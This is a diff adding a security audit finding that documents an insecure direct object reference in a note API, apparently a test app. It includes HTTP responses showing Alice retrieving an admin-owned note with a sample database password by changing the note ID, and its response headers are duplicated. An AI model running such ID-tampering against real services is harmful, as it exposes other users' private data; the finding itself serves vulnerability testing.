@@ -1,0 +1,57 @@
+Finding: F-04 — Insecure direct object reference in note retrieval
+Date: 2026-11-02T00:04:12.9856818+07:00
+Git commit: 93a2e9bf8cd3306d64edc25351c97fbb604b7303
+
+Control 1: unauthenticated request to /api/notes/2
+Expected: 401
+Record observed status here.
+
+Control 2: Alice requests her own note /api/notes/1
+Expected: 200 with owner=alice
+Observed:
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 85
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:03:31 GMT
+
+
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 85
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:03:31 GMT
+
+{
+  "body": "milk, eggs", 
+  "id": 1, 
+  "owner": "alice", 
+  "title": "groceries"
+}
+
+
+Exploit: Alice changes only the note ID to /api/notes/2
+Expected secure result: 403 or 404
+Observed:
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 98
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:03:50 GMT
+
+
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 98
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:03:50 GMT
+
+{
+  "body": "prod db password is hunter2", 
+  "id": 2, 
+  "owner": "admin", 
+  "title": "infra"
+}
+
+
+Result: CONFIRMED if Alice received the admin-owned note.
